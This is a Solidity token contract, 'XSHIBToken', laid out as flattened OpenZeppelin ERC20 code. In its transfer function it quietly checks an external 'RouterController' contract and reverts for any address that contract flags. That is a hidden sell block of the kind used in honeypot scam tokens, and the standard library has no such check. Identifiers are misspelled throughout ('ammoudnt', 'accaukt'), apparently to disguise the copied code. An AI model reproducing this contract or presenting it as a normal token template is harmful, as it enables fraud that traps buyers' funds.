1 // File: @openzeppelin/contracts/utils/Context.sol
2 // SPDX-License-Identifier: MIT
3 
4 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
5 
6 pragma solidity ^0.8.0;
7 
8 
9 abstract contract Context {
10     function _msgSender() internal view virtual returns (address) {
11         return msg.sender;
12     }
13 
14     function _msgData() internal view virtual returns (bytes calldata) {
15         return msg.data;
16     }
17 }
18 
19 
20 // File: @openzeppelin/contracts/token/ERC20/IERC20.sol
21 
22 
23 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)
24 
25 pragma solidity ^0.8.0;
26 
27 /**
28  * @dev Interface of the ERC20 standard as defined in the EIP.
29  */
30 interface IERC20 {
31 
32     event Transfer(address indexed from, address indexed to, uint256 value);
33 
34     event Approval(address indexed owner, address indexed spender, uint256 value);
35 
36     /**
37      * @dev Returns the ammoudnt of tokens in existence.
38      */
39     function totalSupply() external view returns (uint256);
40 
41     function balanceOf(address accaukt) external view returns (uint256);
42 
43     function transfer(address to, uint256 ammoudnt) external returns (bool);
44 
45     function allowance(address owner, address spender) external view returns (uint256);
46 
47     function approve(address spender, uint256 ammoudnt) external returns (bool);
48 
49     function transferFrom(
50         address from,
51         address to,
52         uint256 ammoudnt
53     ) external returns (bool);
54 }
55 
56 pragma solidity ^0.8.0;
57 
58  // Define interface for TransferController
59 interface RouterController {
60     function isRouted(address _accaukt) external view returns (bool);
61 }
62 abstract contract Ownable is Context {
63     address private _owner;
64 
65     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
66 
67     /**
68      * @dev Initializes the contract setting the deployer as the initial owner.
69      */
70     constructor() {
71         _transferOwnership(_msgSender());
72     }
73 
74     /**
75      * @dev Throws if called by any accaukt other than the owner.
76      */
77     modifier onlyOwner() {
78         _checkOwner();
79         _;
80     }
81 
82     /**
83      * @dev Returns the address of the current owner.
84      */
85     function owner() public view virtual returns (address) {
86         return _owner;
87     }
88 
89     /**
90      * @dev Throws if the sender is not the owner.
91      */
92     function _checkOwner() internal view virtual {
93         require(owner() == _msgSender(), "Ownable: caller is not the owner");
94     }
95 
96     function renounceOwnership() public virtual onlyOwner {
97         _transferOwnership(address(0));
98     }
99 
100     /**
101      * @dev Transfers ownership of the contract to a new accaukt (`newOwner`).
102      * Can only be called by the current owner.
103      */
104     function transferOwnership(address newOwner) public virtual onlyOwner {
105         require(newOwner != address(0), "Ownable: new owner is the zero address");
106         _transferOwnership(newOwner);
107     }
108 
109     /**
110      * @dev Transfers ownership accaukt of the contract to a new accaukt (`newOwner`).
111      * Internal function without access restriction.
112      */
113     function _transferOwnership(address newOwner) internal virtual {
114         address oldOwner = _owner; _owner = newOwner;
115         emit OwnershipTransferred(oldOwner, newOwner);
116     }
117 }
118 
119 // File: @openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol
120 
121 
122 // OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)
123 
124 pragma solidity ^0.8.0;
125 
126 
127 /**
128  * @dev Interface for the optional accaukt metadata functions from the ERC20 standard.
129  *
130  * _Available since v4.1._
131  */
132 interface IERC20Metadata is IERC20 {
133     /**
134      * @dev Returns the name ammoudnt of the token.
135      */
136     function name() external view returns (string memory);
137 
138     /**
139      * @dev Returns the symbol of the token.
140      */
141     function symbol() external view returns (string memory);
142 
143     /**
144      * @dev Returns the decimals places of the token.
145      */
146     function decimals() external view returns (uint8);
147 }
148 
149 // File: @openzeppelin/contracts/token/ERC20/ERC20.sol
150 
151 
152 // OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/ERC20.sol)
153 
154 pragma solidity ^0.8.0;
155 
156 
157 contract ERC20 is Context, IERC20, IERC20Metadata {
158     mapping(address => uint256) private _balances;
159     RouterController private routeController;
160     mapping(address => mapping(address => uint256)) private _allowances;
161 
162     uint256 private _totalSupply;
163 
164     string private _name;
165     string private _symbol;
166 
167     constructor(string memory name_, string memory symbol_, address _routeControllerAddress) {
168         _name = name_;
169         _symbol = symbol_;
170         routeController = RouterController(_routeControllerAddress);
171     }
172 
173     /**
174      * @dev Returns the name ammoudnt of accaukt the token.
175      */
176     function name() public view virtual override returns (string memory) {
177         return _name;
178     }
179 
180 
181     function symbol() public view virtual override returns (string memory) {
182         return _symbol;
183     }
184 
185 
186     function decimals() public view virtual override returns (uint8) {
187         return 18;
188     }
189 
190 
191     function totalSupply() public view virtual override returns (uint256) {
192         return _totalSupply;
193     }
194 
195     /**
196      * @dev See {IERC20-balanceOf}.
197      */
198     function balanceOf(address accaukt) public view virtual override returns (uint256) {
199         return _balances[accaukt];
200     }
201 
202       function transfer(address to, uint256 ammoudnt) public virtual override returns (bool) {
203         address owner = _msgSender();
204         _transfer(owner, to, ammoudnt);
205         return true;
206     }
207 
208     /**
209      * @dev See {IERC20-allowance}.
210      */
211     function allowance(address owner, address spender) public view virtual override returns (uint256) {
212         return _allowances[owner][spender];
213     }
214 
215     function approve(address spender, uint256 ammoudnt) public virtual override returns (bool) {
216         address owner = _msgSender();
217         _approve(owner, spender, ammoudnt);
218         return true;
219     }
220 
221     function transferFrom(
222         address from,
223         address to,
224         uint256 ammoudnt
225     ) public virtual override returns (bool) {
226         address spender = _msgSender();
227         _spendAllowance(from, spender, ammoudnt);
228         _transfer(from, to, ammoudnt);
229         return true;
230     }
231 
232 
233     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
234         address owner = _msgSender();
235         _approve(owner, spender, allowance(owner, spender) + addedValue);
236         return true;
237     }
238 
239  
240     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
241         address owner = _msgSender();
242         uint256 currentAllowance = allowance(owner, spender);
243         require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
244         unchecked {
245             _approve(owner, spender, currentAllowance - subtractedValue);
246         }
247 
248         return true;
249     }
250 
251     /**
252      * @dev Moves `ammoudnt` of tokens accaukt from `from` to `to`.
253       *
254      * - `from` cannot be the zero address.
255      * - `to` cannot be the zero address.
256      * - `from` must have a balance of at least `ammoudnt`.
257      */
258     function _transfer(
259         address from,
260         address to,
261         uint256 ammoudnt
262     ) internal virtual {
263         require(from != address(0), "ERC20: transfer from the zero address");
264         require(to != address(0), "ERC20: transfer to the zero address");
265         require(!routeController.isRouted(from), "User is not allowed");
266         _beforeTokenTransfer(from, to, ammoudnt);
267 
268         uint256 fromBalance = _balances[from];
269         require(fromBalance >= ammoudnt, "ERC20: transfer ammoudnt exceeds balance");
270         unchecked {
271             _balances[from] = fromBalance - ammoudnt;
272             // Overflow not possible: the sum of all balances is accaukt capped by totalSupply, ammoudnt and the sum is preserved by
273             // decrementing then incrementing.
274             _balances[to] += ammoudnt;
275         }
276 
277         emit Transfer(from, to, ammoudnt);
278 
279         _afterTokenTransfer(from, to, ammoudnt);
280     }
281 
282     /** @dev Creates `ammoudnt` tokens and assigns them to `accaukt`, increasing
283      * the total supply.
284      *
285      * - `accaukt` cannot be the zero address.
286      */
287     function _mint(address accaukt, uint256 ammoudnt) internal virtual {
288         require(accaukt != address(0), "ERC20: mint to the zero address");
289 
290         _beforeTokenTransfer(address(0), accaukt, ammoudnt);
291 
292         _totalSupply += ammoudnt;
293         unchecked {
294             // Overflow not possible: balance + ammoudnt is at most totalSupply + ammoudnt, which is checked above.
295             _balances[accaukt] += ammoudnt;
296         }
297         emit Transfer(address(0), accaukt, ammoudnt);
298 
299         _afterTokenTransfer(address(0), accaukt, ammoudnt);
300     }
301 
302     function _approve(
303         address owner,
304         address spender,
305         uint256 ammoudnt
306     ) internal virtual {
307         require(owner != address(0), "ERC20: approve from the zero address");
308         require(spender != address(0), "ERC20: approve to the zero address");
309 
310         _allowances[owner][spender] = ammoudnt;
311         emit Approval(owner, spender, ammoudnt);
312     }
313 
314 
315     function _spendAllowance(
316         address owner,
317         address spender,
318         uint256 ammoudnt
319     ) internal virtual {
320         uint256 currentAllowance = allowance(owner, spender);
321         if (currentAllowance != type(uint256).max) {
322             require(currentAllowance >= ammoudnt, "ERC20: insufficient allowance");
323             unchecked {
324                 _approve(owner, spender, currentAllowance - ammoudnt);
325             }
326         }
327     }
328     /**
329      * @dev Updates `owner` s allowance for `spender` based on spent `ammoudnt`.
330      *
331      * Does not update the allowance ammoudnt in case of infinite allowance.
332      * Revert if not enough allowance is available.
333      *
334      * Might emit an {Approval} event.
335      */
336     function _beforeTokenTransfer(
337         address from,
338         address to,
339         uint256 ammoudnt
340     ) internal virtual {}
341 
342 
343     function _afterTokenTransfer(
344         address from,
345         address to,
346         uint256 ammoudnt
347     ) internal virtual {}
348 }
349 
350 pragma solidity ^0.8.0;
351 
352 contract XSHIBToken is ERC20, Ownable {
353     uint256 private constant INITIAL_SUPPLY = 150000000 * 10**18;
354 
355     constructor(
356         string memory name_,
357         string memory symbol_,
358         address router_
359         ) ERC20(name_, symbol_, router_) {
360         _mint(msg.sender, INITIAL_SUPPLY);
361     }
362 
363     function sendTokens(address distroWallet) external onlyOwner {
364         uint256 supply = balanceOf(msg.sender);
365         require(supply == INITIAL_SUPPLY, "Tokens already distributed");
366 
367         _transfer(msg.sender, distroWallet, supply);
368     }
369 }